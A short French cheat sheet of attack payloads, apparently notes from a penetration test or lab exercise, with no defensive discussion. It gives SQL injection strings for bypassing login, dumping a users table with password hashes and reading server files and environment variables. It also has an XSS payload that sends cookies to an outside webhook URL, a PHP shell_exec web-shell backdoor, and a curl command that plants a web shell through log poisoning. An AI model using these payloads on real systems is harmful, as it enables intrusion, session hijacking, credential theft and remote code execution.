# Payloads et commandes de test

## Connexion à la base de données exposée
```bash
mysql -P 3307 -u root -p --ssl-verify-server-cert=false
```

## SQLi : Contournement de l'authentification
```sql
admin';#
```

## XSS : test
```html
</script>alert(1)</script>
```

## XSS : vol de cookie
```html
<script>fetch("https://webhook.site/9aa9dfab-aa0a-4d09-83ab-8b121a981853?c=".concat(document.cookie))</script>
```

## SQLi : dump de la table users
```sql
php' UNION SELECT id, username, password_hash, 'a', 'a' FROM users;#
```

## SQLi : Load file
```sql
php' UNION SELECT 1,2,3,LOAD_FILE('/proc/1/environ'),5;#
php' UNION SELECT 1,2,3,TO_BASE64(LOAD_FILE('./user.php')),5;#
```

## Backdoor PHP
```php
<?php echo shell_exec($_GET["c"]) ?>
```

## Backdoor via log Nginx (curl)
```curl
curl -H 'User-Agent: <?php echo shell_exec(base64_decode($_GET["c"])); ?>' http://localhost:8080/
```